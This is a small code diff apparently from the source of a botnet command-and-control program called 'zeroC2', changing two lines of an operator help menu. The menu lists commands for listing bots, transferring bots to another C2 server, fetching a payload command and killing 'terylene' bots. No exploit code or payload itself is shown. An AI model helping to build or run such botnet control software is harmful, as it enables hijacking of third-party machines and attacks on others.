@@ -52,9 +52,9 @@ methods  -> list all the methods
 help     -> help menu
 clear    -> clear screen
 list     -> list all bots
-transfer -> transfer bots to another zeroC2 server
+transfer -> transfer/mitigate bots to another zeroC2 server
 payload  -> get payload command
-kill     -> kill all terylene bots
+kill     -> kill terylene bots
 exit     -> exit
 `
 	Methods = `
